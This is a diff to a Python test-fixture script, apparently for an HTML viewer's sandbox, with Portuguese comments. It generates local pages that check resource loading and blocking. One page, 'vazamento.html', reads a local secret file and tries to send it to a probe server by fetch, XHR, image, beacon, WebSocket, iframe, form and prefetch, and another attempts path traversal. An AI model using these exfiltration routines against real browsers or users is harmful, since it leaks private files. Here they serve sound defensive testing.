@@ -229,11 +229,16 @@ Bloco depois do link
     # network without any credential, even when challenged.
     probe_log = signals_dir / "probe.json"
     probe_requests = []
+    probe_lock = threading.Lock()
     class Probe(http.server.BaseHTTPRequestHandler):
         def do_GET(self):
-            probe_requests.append({"path": self.path, "authorization": self.headers.get("Authorization") is not None,
-                "cookie": self.headers.get("Cookie") is not None})
-            probe_log.write_text(json.dumps(probe_requests))
+            # Requests arrive on several threads; the log is replaced atomically so a reader never sees half of it.
+            with probe_lock:
+                probe_requests.append({"path": self.path, "authorization": self.headers.get("Authorization") is not None,
+                    "cookie": self.headers.get("Cookie") is not None})
+                partial = probe_log.with_suffix(".tmp")
+                partial.write_text(json.dumps(probe_requests))
+                partial.replace(probe_log)
             self.send_response(401)
             self.send_header("WWW-Authenticate", 'Basic realm="probe"')
             self.send_header("Access-Control-Allow-Origin", "*")
@@ -266,7 +271,9 @@ document.getElementById("app").innerHTML = "<h1>Relatório sintético</h1><p>" +
 <meta name="viewport" content="width=device-width, initial-scale=1"><title>Segurança</title>
 <style>body{font-family:-apple-system;margin:24px}a{display:block;font-size:22px;margin:24px 0}</style></head>
 <body><h1>Página de segurança</h1>
-<p id="arquivo">arquivo: testando</p><p id="rede">rede: testando</p>
+<p id="arquivo">arquivo: testando</p><p id="rede">rede: testando</p><p id="local">local: testando</p>
+<img src="z-local.png" width="1" height="1" alt="" onload="document.getElementById('local').textContent = 'local: carregou'"
+  onerror="document.getElementById('local').textContent = 'local: falhou'">
 <a href="https://example.com/tocado">Abrir site externo</a>
 <a href="https://example.com/nova-janela" target="_blank">Abrir em nova janela</a>
 <img src="PROBE/imagem" alt="" width="1" height="1">
@@ -282,11 +289,114 @@ setTimeout(() => { document.querySelector("a").click() }, 1400)
     with (pages / "d-grande.htm").open("wb") as output:
         output.write(b"<!doctype html><p>Grande</p>")
         output.truncate(26 * 1024 * 1024)
+    (pages / "z-local.png").write_bytes(png(8, 8, 50))
+    # Local-files mode: a page with resources in subfolders (like the reported live-activities page), a report
+    # of several pages, and a page that reads a local file and tries every way out.
+    local = folder / "html-local"
+    for sub in ["t3code", "css", "fonts", "js", "img", "relatorio"]:
+        (local / sub).mkdir(parents=True)
+    (local / "t3code" / "real-lockscreen-detail.png").write_bytes(png(390, 240, 20))
+    (local / "t3code" / "detalhe@2x.png").write_bytes(png(390, 240, 140))
+    (local / "img" / "fundo.png").write_bytes(png(60, 60, 230))
+    shutil.copyfile("/System/Library/Fonts/Supplemental/Andale Mono.ttf", local / "fonts" / "fixture.ttf")
+    (local / "css" / "estilo.css").write_text("""@font-face { font-family: Fixture; src: url(../fonts/fixture.ttf) format("truetype"); }
+h1 { color: rgb(180, 80, 30); font-family: Fixture, monospace; }
+.fundo { height: 40px; background: url("../img/fundo.png") repeat; }
+""", encoding="utf8")
+    (local / "js" / "app.js").write_text("window.jsLocal = 'ok'\n", encoding="utf8")
+    (local / "js" / "util.mjs").write_text("export const valor = 'ok'\n", encoding="utf8")
+    (local / "js" / "mod.mjs").write_text("import { valor } from './util.mjs'\nwindow.modulo = valor\n", encoding="utf8")
+    (local / "segredo.txt").write_text("conteudo-local-secreto", encoding="utf8")
+    (local / "index.html").write_text("""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1"><title>Live Activities</title>
+<link rel="stylesheet" href="css/estilo.css"><script src="js/app.js"></script><script type="module" src="js/mod.mjs"></script>
+<style>body{font-family:-apple-system;margin:20px;background:#14161c;color:#e8e8ea}img{max-width:100%;border-radius:12px}</style>
+</head><body><h1>Código aberto — capturas reais</h1>
+<p id="estado">estado: carregando</p><div class="fundo"></div>
+<h2>T3 Code</h2><img id="i1" loading="lazy" src="t3code/real-lockscreen-detail.png" alt="captura real">
+<img id="i2" srcset="t3code/detalhe@2x.png 2x" src="t3code/real-lockscreen-detail.png" alt="srcset">
+<p><a href="relatorio/index.html">Abrir relatório de várias páginas</a></p>
+<script>
+window.addEventListener("load", async () => {
+  await document.fonts.ready
+  // A lazy image may still be loading after the load event.
+  await Promise.all(["i1", "i2"].map((id) => document.getElementById(id).decode().catch(() => null)))
+  const imagens = ["i1", "i2"].filter((id) => document.getElementById(id).naturalWidth > 0).length
+  const css = getComputedStyle(document.querySelector("h1")).color === "rgb(180, 80, 30)" ? "ok" : "falhou"
+  const fonte = document.fonts.check("12px Fixture") && [...document.fonts].some((f) => f.family.includes("Fixture") && f.status === "loaded") ? "ok" : "falhou"
+  setTimeout(() => {
+    document.getElementById("estado").textContent = "estado: imagens " + imagens + "/2 · css " + css + " · fonte " + fonte +
+      " · js " + (window.jsLocal || "falhou") + " · modulo " + (window.modulo || "falhou")
+  }, 300)
+})
+</script></body></html>""", encoding="utf8")
+    (local / "relatorio" / "index.html").write_text("""<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width">
+<link rel="stylesheet" href="../css/estilo.css"><h1>Relatório · página 1</h1>
+<p><a href="pagina-2.html" style="font-size:22px">Ir para a página 2</a></p>""", encoding="utf8")
+    (local / "relatorio" / "pagina-2.html").write_text("""<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width">
+<h1>Relatório · página 2</h1><p><a href="index.html" style="font-size:22px">Voltar à página 1</a></p>
+<p id="fora">fora: testando</p>
+<script>fetch("../../../fora-do-escopo.dat").then((r) => r.ok ? r.text() : Promise.reject())
+  .then(() => { document.getElementById("fora").textContent = "fora: lido" })
+  .catch(() => { document.getElementById("fora").textContent = "fora: negado" })</script>""", encoding="utf8")
+    # Above the Session directory: outside every scope of these pages (and not a viewer sibling).
+    (root / "fora-do-escopo.dat").write_text("nao deveria ser lido", encoding="utf8")
+    (local / "vazamento.html").write_text("""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1"><link rel="prefetch" href="PROBE/vazamento/prefetch">
+<style>body{font-family:-apple-system;margin:24px}</style></head><body><h1>Tentativas de vazamento</h1>
+<p id="segredo">segredo: testando</p><p id="fora">fora: testando</p><p id="saida">saída: testando</p>
+<form id="form" method="post" action="PROBE/vazamento/form"><input name="d" value=""></form>
+<script>
+const marcar = (id, texto) => { document.getElementById(id).textContent = texto }
+fetch("../../fora-do-escopo.dat").then((r) => r.ok ? marcar("fora", "fora: lido") : marcar("fora", "fora: negado"))
+  .catch(() => marcar("fora", "fora: negado"))
+fetch("segredo.txt").then((r) => r.text()).then((segredo) => {
+  marcar("segredo", "segredo: lido")
+  const d = encodeURIComponent(segredo)
+  const tentativas = []
+  tentativas.push(fetch("PROBE/vazamento/fetch?d=" + d, { mode: "no-cors" }).then(() => "fetch").catch(() => null))
+  tentativas.push(new Promise((ok) => { const x = new XMLHttpRequest(); x.open("GET", "PROBE/vazamento/xhr?d=" + d)
+    x.onload = () => ok("xhr"); x.onerror = () => ok(null); x.send() }))
+  tentativas.push(new Promise((ok) => { const i = new Image(); i.onload = () => ok("img"); i.onerror = () => ok(null)
+    i.src = "PROBE/vazamento/img?d=" + d }))
+  try { navigator.sendBeacon("PROBE/vazamento/beacon", segredo) } catch {}
+  try { const w = new WebSocket("WSPROBE/vazamento/ws?d=" + d); w.onopen = () => marcar("saida", "saída: websocket abriu") } catch {}
+  const f = document.createElement("iframe"); f.src = "PROBE/vazamento/frame?d=" + d; document.body.appendChild(f)
+  document.querySelector("input").value = segredo
+  setTimeout(() => document.getElementById("form").submit(), 300)
+  Promise.all(tentativas).then((r) => { const ok = r.filter(Boolean)
+    marcar("saida", ok.length ? "saída: chegou por " + ok.join(",") : "saída: bloqueada") })
+}).catch(() => marcar("segredo", "segredo: falhou"))
+</script></body></html>""".replace("WSPROBE", probe_url.replace("http", "ws")).replace("PROBE", probe_url), encoding="utf8")
+    live = outside / "live-activities"
+    (live / "t3code").mkdir(parents=True)
+    (live / "t3code" / "real-lockscreen-detail.png").write_bytes(png(390, 240, 60))
+    (live / "t3code" / "render-lockscreen-states.png").write_bytes(png(390, 240, 160))
+    (live / "index.html").write_text("""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1"><title>Live Activities</title>
+<style>body{font-family:-apple-system;margin:20px;background:#14161c;color:#e8e8ea}img{width:100%;border-radius:12px;margin:8px 0}
+.tag{background:#1d3b28;color:#7fd99a;padding:2px 8px;border-radius:6px;font-size:13px}</style></head>
+<body><h1>Código aberto — capturas reais + reconstruções do código</h1>
+<p id="estado">estado: carregando</p><p id="fora">fora: testando</p><h2>T3 Code (Theo / pingdotgg)</h2>
+<p><span class="tag">captura real/oficial</span> real-lockscreen-detail.png</p>
+<img loading="lazy" src="t3code/real-lockscreen-detail.png" alt="real-lockscreen-detail.png">
+<p><span class="tag">reconstrução do código</span> render-lockscreen-states.png</p>
+<img loading="lazy" src="t3code/render-lockscreen-states.png" alt="render-lockscreen-states.png">
+<script>window.addEventListener("load", async () => {
+  // Lazy images may still be loading after the load event.
+  await Promise.all([...document.images].map((i) => i.decode().catch(() => null)))
+  const ok = [...document.images].filter((i) => i.naturalWidth > 0).length
+  document.getElementById("estado").textContent = "estado: " + ok + " de " + document.images.length + " imagens"
+})
+fetch("../fora.png").then((r) => { document.getElementById("fora").textContent = r.ok ? "fora: lido" : "fora: negado" })
+  .catch(() => { document.getElementById("fora").textContent = "fora: negado" })</script></body></html>""", encoding="utf8")
     (pages / "e-pagina.htm").write_text("<!doctype html><meta charset=utf-8><meta name=viewport content='width=device-width'><h1>Página HTM unificada</h1>", encoding="utf8")
     environment["OPENCODE_VIEWER_PROBE_LOG"] = str(probe_log)
     single.update({"LINK_HTML_A": "[Abrir HTML_A](html/a-estatico.html)", "LINK_HTML_B": "[Abrir HTML_B](html/b-relatorio.html)",
         "LINK_HTML_C": "[Abrir HTML_C](html/c-seguranca.html)", "LINK_HTML_D": "[Abrir HTML_D](html/d-grande.htm)",
-        "LINK_HTML_E": "[Abrir HTML_E](html/e-pagina.htm)"})
+        "LINK_HTML_E": "[Abrir HTML_E](html/e-pagina.htm)", "LINK_LOCAL_INDEX": "[Abrir LOCAL_INDEX](html-local/index.html)",
+        "LINK_LOCAL_VAZAMENTO": "[Abrir LOCAL_VAZAMENTO](html-local/vazamento.html)",
+        "LINK_LIVE": "[Abrir LIVE](" + str(live / "index.html") + ")"})
     messages = {**single, "LINKS": text, "DOCS": docs_text, "FEED": "Imagem incorporada:\n\n![Quadro](a-imagem.png)", "DATA": "Imagem embutida:\n\n![Embutida](" + data_uri + ")"}
     now = int(time.time() * 1000)
     for role, body in messages.items():
